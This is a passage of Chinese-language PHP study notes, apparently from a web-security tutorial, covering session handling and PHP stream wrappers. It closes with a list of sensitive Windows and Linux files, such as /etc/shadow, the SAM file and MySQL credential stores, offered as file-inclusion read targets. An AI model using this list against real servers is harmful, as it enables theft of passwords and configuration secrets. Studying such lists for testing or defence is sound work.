Session可以用于一些场景：比如记录用户的登录状态、用户的购物车信息等等。

## 3.Session的特点

可靠性：Session数据是存储在服务器端的，用户不能随意清除，所以Session数据较为可靠。

安全性：由于Session数据存储在服务器端，客户端无法获取到Session数据，因此Session的安全性相对较好。

## PHP中操作Session

### 1.开启Session

在使用Session之前，需要开启Session。在PHP中，可以通过以下代码进行Session的开启：

```php
session_start();
```

### 2.设置Session

在PHP中设置Session可以使用$_SESSION超全局变量进行操作，使用方法如下：

```php
$_SESSION['name'] = 'tom';
```

### 3.获取Session

在PHP中获取Session也可以使用$_SESSION超全局变量获取，使用方法与获取Cookie相同：

```php
$value= $_SESSION ['name'];
```

### 4.删除Session

在PHP中删除Session可以使用unset()函数：

```php
unset($_SESSION['name']);
```

### 5.销毁Session

在PHP中销毁Session可以使用session_destroy()函数：

```php
session_destroy();
```



## cookie和session 的区别

https://blog.csdn.net/weixin_44369049/article/details/132062232

# PHP支持的协议和封装协议

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — 安全外壳协议 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```



## 文件包含参考的读取pyload（区分linux和windows）

```
Windows系统   包含可以读取的文件

c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息

Linux/Unix系统

/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
```

